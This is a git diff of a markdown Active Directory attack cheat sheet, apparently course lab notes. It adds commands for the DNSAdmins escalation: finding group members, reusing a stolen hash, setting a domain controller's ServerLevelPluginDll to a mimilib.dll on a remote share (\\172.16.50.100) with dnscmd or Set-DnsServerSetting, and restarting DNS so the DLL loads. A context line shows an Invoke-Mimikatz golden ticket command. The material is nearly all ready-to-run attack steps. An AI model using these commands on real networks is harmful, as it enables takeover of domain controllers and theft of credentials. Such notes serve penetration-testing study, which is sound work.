@@ -699,15 +699,21 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 **Enumerate the members of the DNSAdmin group**
 - `Get-NetGroupMember -GroupName "DNSAdmins"`
 
-**Using ActiveDirectory Module**
-- `Get-ADGroupMember -Identity DNSAdmins`
+- Using ActiveDirectory Module**
+  - `Get-ADGroupMember -Identity DNSAdmins`
 
 - Once we know the members of the DNSAdmins group, we need to compromise a member. We already have hash of srvadmin because of derivative local admin.
 
 - From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS)
-- `dnscmd dcorp-dc /config /serverlevelplugindl \\172.16.50.100\dll\mimilib.dll`
+  - `dnscmd dcorp-dc /config /serverlevelplugindl \\172.16.50.100\dll\mimilib.dll`
 
 - Using DNSServer module (needs RSAT DNS)
-- `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All`
-- `$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"`
-- `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
+  - `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All`
+  - `$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"`
+  - `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
+
+- Restart the DNS service (assuming that the DNSAdmins group has the permissio to do so)
+  - `sc \\dcorp-dc stop dns`
+  - `sc \\dcorp-dc start dns`
+
+- By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log
